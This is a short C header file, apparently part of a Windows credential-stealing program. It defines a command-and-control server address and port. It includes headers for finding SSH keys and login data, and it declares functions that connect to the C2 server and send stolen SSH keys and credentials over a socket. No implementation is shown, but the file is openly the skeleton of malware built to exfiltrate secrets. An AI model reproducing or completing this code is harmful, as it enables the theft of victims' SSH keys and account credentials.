#ifndef C2_H
#define C2_H
#include <windows.h>
#include <winsock2.h>

#include "find_ssh_key.h"
#include "logins.h"

#define C2_IP "192.168.1.17"
#define C2_PORT 1234

BOOL send_ssh_key(sshKey[MAX_KEY_FILES], DWORD32, SOCKET *);
BOOL send_credentials(SOCKET *, Credential *, DWORD32);
BOOL connect_to_c2(SOCKET *);
#endif